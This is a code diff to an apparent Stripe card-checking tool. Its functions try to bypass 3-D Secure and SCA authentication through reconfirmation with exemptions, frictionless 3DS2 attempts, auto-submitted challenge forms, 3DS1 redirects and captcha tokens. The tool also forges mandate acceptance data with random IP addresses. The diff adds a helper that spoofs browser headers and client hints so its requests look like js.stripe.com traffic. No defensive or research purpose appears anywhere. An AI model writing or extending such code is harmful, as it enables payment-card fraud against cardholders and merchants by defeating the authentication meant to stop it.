@@ -50,6 +50,26 @@ def _classify_error(error_data):
     return "declined", f"{code}: {msg[:60]}"
 
 
+def _build_js_headers(passed_headers, content_type="application/x-www-form-urlencoded"):
+    ua = (passed_headers or {}).get("user-agent") or (passed_headers or {}).get("User-Agent") or UA
+    headers = {
+        "User-Agent": ua,
+        "Content-Type": content_type,
+        "Origin": "https://js.stripe.com",
+        "Referer": "https://js.stripe.com/",
+        "Accept": "application/json",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site"
+    }
+    # Propagate client hints if present in passed_headers
+    for key in ["sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"]:
+        val = (passed_headers or {}).get(key)
+        if val:
+            headers[key] = val
+    return headers
+
+
 # ============= PRE-3DS FAST PATH: RE-CONFIRM WITH SCA EXEMPTIONS =============
 
 async def attempt_reconfirm_bypass(loop, session, pk, intent_id, client_secret, pm_id, intent_type, headers):
@@ -88,7 +108,7 @@ async def attempt_reconfirm_bypass(loop, session, pk, intent_id, client_secret, 
             "payment_method": pm_id,
             "mandate_data[customer_acceptance][type]": "online",
             "mandate_data[customer_acceptance][online][ip_address]": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
-            "mandate_data[customer_acceptance][online][user_agent]": UA,
+            "mandate_data[customer_acceptance][online][user_agent]": (headers or {}).get("user-agent") or (headers or {}).get("User-Agent") or UA,
             "error_on_requires_action": "true",
             "key": pk,
         },
@@ -238,13 +258,7 @@ async def attempt_3ds2_frictionless(loop, session, pk, client_secret, intent_id,
         "threeDSCompInd": "U",
     })
 
-    js_headers = {
-        "User-Agent": UA,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://js.stripe.com",
-        "Referer": "https://js.stripe.com/",
-        "Accept": "application/json",
-    }
+    js_headers = _build_js_headers(headers)
 
     for var_idx, var_data in enumerate(auth_variations):
         browser_data = json.dumps({
@@ -256,7 +270,7 @@ async def attempt_3ds2_frictionless(loop, session, pk, client_secret, intent_id,
             "browserScreenHeight": "1080",
             "browserScreenWidth": "1920",
             "browserTZ": tz_offset,
-            "browserUserAgent": UA,
+            "browserUserAgent": js_headers["User-Agent"],
         })
 
         auth_data = {
@@ -413,7 +427,7 @@ async def attempt_3ds2_challenge(loop, session, pk, client_secret, intent_id, in
             logger.info(f"3DS2 challenge: auto-submitting ACS form to {action_url[:60]}...")
             form_resp = await loop.run_in_executor(None, lambda: session.post(
                 action_url, data=form_data,
-                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
+                headers=_build_js_headers(headers),
                 allow_redirects=True, timeout=20))
             form_body = form_resp.text
             form_final = str(form_resp.url)
@@ -448,7 +462,13 @@ async def attempt_3ds1_redirect(loop, session, pk, client_secret, intent_id, int
         logger.info(f"3DS1: following redirect to {redirect_url[:60]}...")
         resp = await loop.run_in_executor(None, lambda: session.get(
             redirect_url,
-            headers={"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
+            headers={
+                "User-Agent": (headers or {}).get("user-agent") or (headers or {}).get("User-Agent") or UA,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "sec-fetch-dest": "document",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-site": "none"
+            },
             allow_redirects=True, timeout=20))
         body = resp.text
         final_url = str(resp.url)
@@ -468,7 +488,7 @@ async def attempt_3ds1_redirect(loop, session, pk, client_secret, intent_id, int
             form_data = {name: value for name, value in hidden_inputs}
             form_resp = await loop.run_in_executor(None, lambda: session.post(
                 action_url, data=form_data,
-                headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
+                headers=_build_js_headers(headers),
                 allow_redirects=True, timeout=20))
             form_final = str(form_resp.url)
             if "return_url" in form_final or "stripe.com" in form_final:
@@ -580,13 +600,7 @@ async def attempt_captcha_verification(loop, session, pk, client_secret, intent_
         "challenge_response_ekey": captcha_token,
     }
 
-    js_headers = {
-        "User-Agent": UA,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Origin": "https://js.stripe.com",
-        "Referer": "https://js.stripe.com/",
-        "Accept": "application/json",
-    }
+    js_headers = _build_js_headers(headers)
 
     try:
         vr = await loop.run_in_executor(None, lambda: session.post(
